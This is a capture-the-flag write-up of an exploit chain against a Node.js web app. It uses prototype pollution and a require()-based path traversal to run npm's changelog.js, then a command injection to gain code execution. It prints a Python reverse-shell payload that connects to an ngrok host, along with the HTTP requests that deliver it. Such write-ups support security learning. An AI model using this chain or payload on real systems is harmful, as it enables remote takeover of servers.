# Animals

{% file src="../../.gitbook/assets/animals-countdown.zip" %}

There is a prototype pollution vulnerability in `/api/tet/list` when merging the request data:

```javascript
app.post('/api/tet/list', function (req, res, next) {
    try {
        const getList1 = require("./static/list-2010-2016.js")
        const getList2 = require("./static/list-2017-2022.js")
        let newList = merge(getList1.all(), getList2.all())
        let data = req.body.data || "";
        newList = merge(newList, data);
        res.json(newList)
    } catch (error) {
        res.send(error)
    }
})
```

Furthermore, user input being passed to `require()` leads to a LFI vulnerability.

```javascript
app.post('/api/tet/years', function (req, res, next) {
    try {
        const list = req.body.list.toString();
        const getList = require("./static/" + list)
        res.json(getList.all())
    } catch (error) {
        console.log(error);
        res.send(error)
    }
})
```

If we could find a _valid `.js` file_ that _uses an attribute that we are able to pollute_ to spawn a new process or execute a command, then we could escalate this to an RCE.

In the Docker container, the most likely place where we could find a suitable candidate would be in the `node_modules` folder, containing the source code of the installed modules.

Doing a simple search for the `child_process` string, we could find some interesting scripts:

```
$ cd /usr/local/lib/node_modules
$ grep -r "child_process" .

...

./npm/scripts/changelog.js:const execSync = require('child_process').execSync
./npm/scripts/update-dist-tags.js:const { execSync } = require('child_process')
```

The `changelog.js` script indeed has an `execSync` call with a possible command injection.

```javascript
'use strict'
/*
Usage:

node scripts/changelog.js [comittish]

Generates changelog entries in our format as best as its able based on
commits starting at comittish, or if that's not passed, latest.

Ordinarily this is run via the gen-changelog shell script, which appends
the result to the changelog.

*/
const execSync = require('child_process').execSync
const branch = process.argv[2] || 'origin/latest'
const log = execSync(`git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...`).toString().split(/\n/)
```

Since the `require()` call would not pass in any arguments, `process.argv[2]` is undefined. Therefore, we can pollute `process.argv[2]` with a command injection payload before importing the `changelog.js` file.

Testing this locally:

```javascript
let a = {}

const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (dest, src) => {
    for (var attr in src) {
        console.log(attr);
        if (isObject(dest[attr]) && isObject(src[attr])) {
            merge(dest[attr], src[attr]);
        } else {
            dest[attr] = src[attr];
        }
    }
    return dest
};

b = { 
    ['__proto__']: { 
        '2': "; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"6.tcp.ngrok.io\",13984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")';"
    } 
}

merge(a, b);
require('./changelog.js');
```

To perform this exploit chain on web server, we first perform the prototype pollution:

```http
POST /api/tet/list HTTP/1.1

...

Content-Type: application/json

{
    "data": {
        "__proto__": {
            "2":"; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"6.tcp.ngrok.io\",13984));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")';"
        }
    }
}
```

Then, we exploit the LFI vulnerability to execute the `changelog.js` script.

```http
POST /api/tet/years HTTP/1.1

...

Content-Type: application/json
Content-Length: 81

{"list":"../../../../../usr/local/lib/node_modules/npm/scripts/changelog.js"}
```

This should grant us our reverse shell.

```
$ cd /
$ ./readflag
TetCTF{c0mbine_p0lLut3_lFiii_withN0d3<3}
```
